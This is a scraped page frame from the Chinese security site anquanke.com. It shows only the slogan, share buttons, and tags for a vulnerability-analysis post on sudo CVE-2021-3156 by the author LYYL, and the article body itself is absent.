[https://www.anquanke.com/post/id/231408](/post/id/231408)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [SUDO](/tag/SUDO)
  * [双倍活动](/tag/双倍活动)
  * [CVE-2021-3156](/tag/CVE-2021-3156)

 **+1** __6赞

 __收藏

![](https://p3.ssl.qhimg.com/t01746f731cb508f164.png) LYYL

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

